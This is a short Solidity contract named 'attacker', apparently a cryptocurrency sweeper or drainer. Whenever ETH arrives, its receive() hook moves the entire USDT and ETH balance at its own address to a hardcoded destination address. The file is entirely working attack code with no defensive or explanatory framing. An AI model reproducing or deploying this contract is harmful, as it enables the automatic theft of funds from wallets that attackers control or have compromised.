// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract attacker {

    address public constant USDT = 0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0;
    
    address public constant DESTINATION = 0x405f24B4C3C0DbEFbc2D333bABE8d73B99F7744b;
    
    receive() external payable {

        IERC20 usdt = IERC20(USDT);
        uint256 usdtBalance = usdt.balanceOf(address(this));
        
        if (usdtBalance > 0) {
            usdt.transfer(DESTINATION, usdtBalance);
        }

        if (address(this).balance > 0) {
            (bool success, ) = DESTINATION.call{value: address(this).balance}("");
            require(success, "ETH transfer failed");
        }
    }
}
